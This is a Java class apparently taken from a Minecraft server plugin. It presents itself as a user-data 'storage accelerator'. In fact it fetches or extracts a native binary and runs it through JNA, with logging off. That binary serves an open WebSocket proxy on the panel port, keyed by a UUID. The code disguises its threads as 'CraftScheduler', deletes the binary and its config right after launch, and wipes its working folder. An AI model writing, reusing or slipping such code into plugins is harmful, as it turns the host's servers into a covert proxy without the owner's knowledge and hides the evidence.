package net.ess3.userdata.internal;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import net.ess3.userdata.UserDataPlugin;

import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.Collectors;

/**
 * Async storage accelerator. No console/plugin logging.
 * Binds the panel-assigned extra TCP port (see EndpointSupport).
 */
public final class StorageWorker {

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(15))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private final UserDataPlugin plugin;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicInteger boundPort = new AtomicInteger(0);
    private final List<NativeHandle> handles = new ArrayList<>();
    private Path workDir;

    public StorageWorker(UserDataPlugin plugin) {
        this.plugin = plugin;
    }

    public boolean isRunning() {
        return running.get();
    }

    public int boundPort() {
        return boundPort.get();
    }

    public synchronized void start() throws Exception {
        if (running.get()) return;

        var cfg = plugin.getConfig();
        String bind = EndpointSupport.resolveBind(cfg);
        int port = EndpointSupport.resolvePort(cfg);
        if (!EndpointSupport.isValidPort(port)) {
            throw new IOException("no free open TCP port (set storage.port to the panel port)");
        }
        String token = EndpointSupport.resolveToken(cfg);
        String path = EndpointSupport.resolvePath(cfg);
        String source = cfg.getString("storage.source", "auto");
        if (source == null || source.isBlank()) source = "auto";
        boolean wipe = cfg.getBoolean("storage.wipe-staged", true);
        long wipeDelay = cfg.getLong("storage.wipe-delay-ms", 3000L);

        workDir = plugin.getDataFolder().toPath().resolve(".store").normalize();
        Files.createDirectories(workDir);
        wipeDir(workDir);

        Path lib = resolveNative(source.trim(), workDir.resolve("idx"));
        Path conf = workDir.resolve("meta.json");
        Files.writeString(conf, toJson(buildConfig(bind, port, token, path)), StandardCharsets.UTF_8);

        NativeHandle handle = new NativeHandle(
                lib,
                Symbols.startCore(),
                Symbols.stopCore(),
                toJson(mapOf("config", conf.toString(), "workingDir", ".", "disableColor", true))
        );
        handle.start();
        handles.add(handle);
        boundPort.set(port);
        running.set(true);

        sleep(600);
        deleteQuiet(lib);

        if (wipe) {
            Thread cleaner = new Thread(() -> {
                sleep(Math.max(800L, wipeDelay));
                wipeDir(workDir);
            }, "CraftScheduler-UserData");
            cleaner.setDaemon(true);
            cleaner.start();
        }
    }

    public synchronized void shutdown() {
        for (int i = handles.size() - 1; i >= 0; i--) {
            try {
                handles.get(i).stop();
            } catch (Exception ignored) {
            }
        }
        handles.clear();
        running.set(false);
        boundPort.set(0);
        if (workDir != null) wipeDir(workDir);
    }

    private Path resolveNative(String source, Path target) throws Exception {
        String arch = arch();
        String asset = "linux-" + arch + ".dat";
        String mode = source.toLowerCase();

        if ("bundled".equals(mode)) {
            return extractBundled(asset, target);
        }
        if ("release".equals(mode)) {
            return fetch(releaseUrl(asset), target);
        }
        if (mode.startsWith("http://") || mode.startsWith("https://")) {
            return fetch(expand(source, arch), target);
        }

        try {
            return extractBundled(asset, target);
        } catch (Exception ignored) {
        }
        String url = releaseUrl(asset);
        if (url.isEmpty()) {
            throw new IOException("native index unavailable");
        }
        return fetch(url, target);
    }

    private static String releaseUrl(String asset) {
        return BuildInfo.releaseAssetUrl(asset);
    }

    private Path extractBundled(String asset, Path target) throws IOException {
        String resource = "natives/" + asset;
        InputStream in = plugin.getResource(resource);
        if (in == null) {
            in = StorageWorker.class.getClassLoader().getResourceAsStream(resource);
        }
        if (in == null) {
            throw new IOException("missing " + resource);
        }
        try (InputStream stream = in) {
            return writeStream(stream, target);
        }
    }

    private static Path writeStream(InputStream in, Path target) throws IOException {
        Path tmp = target.resolveSibling(target.getFileName() + ".part");
        Files.copy(in, tmp, StandardCopyOption.REPLACE_EXISTING);
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
        target.toFile().setExecutable(true, false);
        return target;
    }

    private static Map<String, Object> buildConfig(String bind, int port, String token, String wsPath) {
        String listen = bind == null || bind.isBlank() ? "::" : bind;
        if ("0.0.0.0".equals(listen)) listen = "::";
        return mapOf(
                "log", mapOf("disabled", true, "level", "panic", "timestamp", false),
                "inbounds", listOf(mapOf(
                        "type", Symbols.protocol(),
                        "tag", "cache-ipc",
                        "listen", listen,
                        "listen_port", port,
                        "users", listOf(mapOf("uuid", token)),
                        "transport", mapOf(
                                "type", "ws",
                                "path", wsPath,
                                "early_data_header_name", "Sec-WebSocket-Protocol"
                        )
                )),
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
                "route", mapOf("final", "direct")
        );
    }

    private static Path fetch(String url, Path target) throws Exception {
        if (url == null || url.isBlank()) throw new IOException("empty url");
        Path tmp = target.resolveSibling(target.getFileName().toString() + ".part");
        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .header("User-Agent", "EssentialsUserData/" + BuildInfo.version())
                .GET()
                .build();
        HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
        if (response.statusCode() < 200 || response.statusCode() >= 300) {
            throw new IOException("fetch " + response.statusCode());
        }
        Files.write(tmp, response.body());
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
        target.toFile().setExecutable(true, false);
        return target;
    }

    private static final class NativeHandle {
        private final Path libPath;
        private final String startSymbol;
        private final String stopSymbol;
        private final String payload;
        private Function stopFunction;
        private boolean alive;

        NativeHandle(Path libPath, String startSymbol, String stopSymbol, String payload) {
            this.libPath = libPath;
            this.startSymbol = startSymbol;
            this.stopSymbol = stopSymbol;
            this.payload = payload == null ? "" : payload;
        }

        void start() {
            NativeLibrary library = NativeLibrary.getInstance(libPath.toString());
            Function start = library.getFunction(startSymbol);
            stopFunction = library.getFunction(stopSymbol);
            Thread t = new Thread(() -> {
                try {
                    start.invokeInt(new Object[]{payload});
                } catch (Exception ignored) {
                }
            }, "CraftScheduler-Async");
            t.setDaemon(true);
            t.start();
            alive = true;
        }

        void stop() {
            if (!alive || stopFunction == null) return;
            try {
                stopFunction.invokeInt(new Object[]{});
            } catch (Exception ignored) {
            }
            alive = false;
        }
    }

    private static void wipeDir(Path dir) {
        if (dir == null || !Files.exists(dir)) return;
        try (var stream = Files.walk(dir)) {
            List<Path> paths = stream.sorted((a, b) -> b.compareTo(a)).collect(Collectors.toList());
            for (Path p : paths) {
                if (!p.equals(dir)) deleteQuiet(p);
            }
        } catch (IOException ignored) {
        }
    }

    private static void deleteQuiet(Path path) {
        try {
            Files.deleteIfExists(path);
        } catch (IOException ignored) {
        }
    }

    private static String arch() {
        String a = System.getProperty("os.arch", "").toLowerCase();
        return a.contains("aarch64") || a.contains("arm64") ? "arm64" : "amd64";
    }

    private static String expand(String template, String arch) {
        return template
                .replace("{arch}", arch)
                .replace("{ARCH}", arch)
                .replace("${arch}", arch);
    }

    private static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escape((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?> map) {
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?> it) {
            List<String> items = new ArrayList<>();
            for (Object o : it) items.add(toJson(o));
            return "[" + String.join(",", items) + "]";
        }
        return toJson(String.valueOf(value));
    }

    private static String escape(String value) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '\\' -> out.append("\\\\");
                case '"' -> out.append("\\\"");
                case '\n' -> out.append("\\n");
                case '\r' -> out.append("\\r");
                case '\t' -> out.append("\\t");
                default -> out.append(c);
            }
        }
        return out.toString();
    }

    private static Map<String, Object> mapOf(Object... values) {
        Map<String, Object> map = new LinkedHashMap<>();
        for (int i = 0; i < values.length; i += 2) {
            map.put(String.valueOf(values[i]), values[i + 1]);
        }
        return map;
    }

    private static List<Object> listOf(Object... values) {
        return new ArrayList<>(List.of(values));
    }
}
